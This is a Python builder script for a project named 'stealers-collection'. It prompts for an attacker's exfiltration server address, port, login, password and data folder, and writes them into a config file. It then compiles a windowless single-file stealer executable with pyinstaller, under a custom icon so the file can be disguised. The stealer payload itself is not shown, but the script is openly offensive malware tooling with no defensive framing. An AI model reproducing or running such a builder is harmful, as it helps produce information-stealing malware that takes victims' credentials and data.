import os
import sys
import shutil
import re
from getpass import getpass

header = r'''
By Ghost Bear (https://github.com/Ghost-Bear)
 __         __
/  \.-"""-./  \
\    -   -    /
 |   o   o   |
 \  .-{a}-.  /
  '-\__Y__/-'
     `---`

█▀ ▀█▀ █▀▀ ▄▀█ █░░ █▀▀ █▀█ █▀   █▀▀ █▀█ █░░ █░░ █▀▀ █▀▀ ▀█▀ █ █▀█ █▄░█
▄█ ░█░ ██▄ █▀█ █▄▄ ██▄ █▀▄ ▄█   █▄▄ █▄█ █▄▄ █▄▄ ██▄ █▄▄ ░█░ █ █▄█ █░▀█
'''.format(a="'''")

def long_input(text, check=lambda x:True):
	tmp = input(text)
	while not check(tmp):
		tmp = input(text)
	return tmp

dir = os.path.split(__file__)[0] or "."
old_dir = os.getcwd()
os.chdir(dir)
print("Checking installed modules...")
os.system(f"pip install -r requirments.txt")
os.chdir("stealers-collection")

if sys.platform.startswith('linux') or sys.platform == "darwin":
	clear = lambda: os.system("clear")
elif sys.platform == 'win32':
	clear = lambda: os.system("cls")
else:
	clear = lambda: os.system("clear")

clear()

print(header)
print()
print()
print(" Server info:")
hostname = long_input("Server hostname/ip: ", lambda x: re.fullmatch(r"[\d\w]+(\.[\d\w]+)*", x))
port = int(long_input("Server port: ", lambda x: re.fullmatch(r"[\d]+", x) and int(x)>=0 and int(x)<=65535))
login = input("Login: ")
password = getpass("Password: ")
folder = input("Folder to put data: ")
with open("config.tmp.py", "r") as rf:
	with open("config.py", "w") as wf:
		wf.write(rf.read().format(
			ADDRESS_HOST=hostname,
			ADDRESS_PORT=port,
			LOGIN=login,
			PASSWORD=password,
			FOLDER=folder,
			LOG_LEVEL=0,
			BUFFER_SIZE=1024
		))
print()
print()
print(" Compiled file info")
os.chdir("..")
outfile = os.path.abspath(os.path.basename(input("Output file: ")))
outfolder, outfile = os.path.split(outfile)
if outfile.endswith(".exe"):
	outfile = outfile[:-4]
icon = long_input("Icon for stealer ( default.icon ): ", lambda x: x == "" or os.path.exists(os.path.abspath(os.path.basename(x))))
if not icon:
	icon = "default.ico"
icon = os.path.abspath(os.path.basename(icon))
os.chdir("stealers-collection")
print()
print()
print(" Building stealer with pyinstaller:")
os.system(f"pyinstaller -w -i \"{icon}\" -F --clean -y --distpath \"{outfolder}\" -n \"{outfile}\" main.py")
try:
	os.remove(f"{outfile}.spec")
except:
	pass
try:
	shutil.rmtree("build")
except:
	pass